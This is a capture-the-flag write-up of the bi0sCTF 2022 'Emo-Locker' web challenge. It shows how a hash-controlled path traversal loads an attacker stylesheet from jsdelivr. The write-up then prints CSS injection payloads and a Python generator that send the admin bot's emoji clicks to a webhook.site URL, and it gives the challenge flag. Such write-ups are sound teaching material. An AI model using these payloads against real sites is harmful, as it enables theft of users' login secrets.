---
title: Emo-Locker - bi0sCTF 2022
date: 2023-01-23 18:21:08
author: Yadhu Krishna
author_url: https://twitter.com/YadhuKrishna_
categories:
  - Web 
tags:
  - XSLeaks
  - CSS injection
---


**tl;dr**
    - CSS injection using url forging
    - leaking password using `:empty` selectors

<!--more-->

**Challenge points**: 984
**No. of solves**: 7

## Challenge Description

All new emoji-based authentication service. See if you can get the admin's emojis. 🥷

The source code of this challenge can be downloaded from [here](https://github.com/yadhukrishnam/bi0sCTF22).

## Analysis

Upon opening the challenge link, we are presented with a lockscreen that uses emojis instead of numbers. The page has two features: register and login. Additionally, there is an admin bot, which suggests that the challenge may involve client-side concepts. 

![](https://i.imgur.com/tnkk4nj.png)

The frontend of this application is developed in React.js. After analyzing the client-side JavaScript source code, we discover a hidden feature:

```js
{
    key: "switchTheme",
    value: function() {
        this.setState((function(e) {
            var n = "https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/".concat(window.location.hash.replace("#", ""), "-mode.css");
            return e.link_obj.href = n, {}
        }))
    }
}
```

```js
{
    key: "componentWillUnmount",
    value: function() {
        window.removeEventListener("hashchange", this.switchTheme, !1)
    }
}
```

On looking into [https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/](https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/) can find that this can be used to switch themes - `dark` or `light`, by toogling the hash. Thus, we now have a functionalty that can load limited stylesheets into the page. 

## Exploit

At this point, one may have two questions:
1. Is it possible to load arbitrary stylesheets into the page?
2. If so, what can be done with this ability?

### Injecting Arbitary Stylesheets

Upon visiting the homepage of [jsdelivr](https://www.jsdelivr.com/), we can discover that it is a public CDN that can be used to embed files from various sources such as GitHub, npm, and WordPress. This means that it is possible to embed files from any GitHub repository using the following format:

```
https://cdn.jsdelivr.net/gh/[user-name]/[repository-name]/[file-path]
```

Since `window.location.hash` is directly placed into the `href` attribute we can simply use `../` to embed files from any repository in our control. 

```
http://web.chall.bi0s.in:10101/#../../../../gh/yadhukrishna/nothing-here@main/hola
```

Thus, it is possible to embed any stylesheet into the document by changing `window.location.hash` and hence, causing CSS Injection.

### Exploiting CSS Injection

On observing the UI carefully, one can find that each emoji is represented with:

```html
<span aria-label="105" role="img">💀</span>
```

On examining closer, we identify:
1. The `aria-label` value is sent in the request when the login button is clicked. Thus, `aria-label` value can be used to uniquely identify an emoji.
2. When an emoji is clicked, it is removed from the content of the `<span>` element, which makes it empty. 

These can be used to detect clicks using the `:empty` pseudo-class selector.

For example,

On clicking the 12th emoji, a request can be sent to the specified URL, if we inject the below CSS.

```css
span[role="img"][aria-label="12"]:empty {
    background: url('https://webhook.site/7ecc884d-b05b-4433-97f7-574d1d78dc63/?item=12');
}
```

This can be used to detect admin bot's clicks and capture the login information.

```py
exploit_css = ""

for i in range(1, 164):
    exploit_css += '''
    span[role="img"][aria-label="''' + str(i) + '''"]:empty {
        background: url('https://webhook.site/7ecc884d-b05b-4433-97f7-574d1d78dc63/?item=''' + str(i) + '''');
    }
    '''
    
print (exploit_css)
```

![](https://i.imgur.com/qjVwRgf.png)


## Flag

```
bi0sctf{a34522e2009192570c840f931e4c3c0a}
```

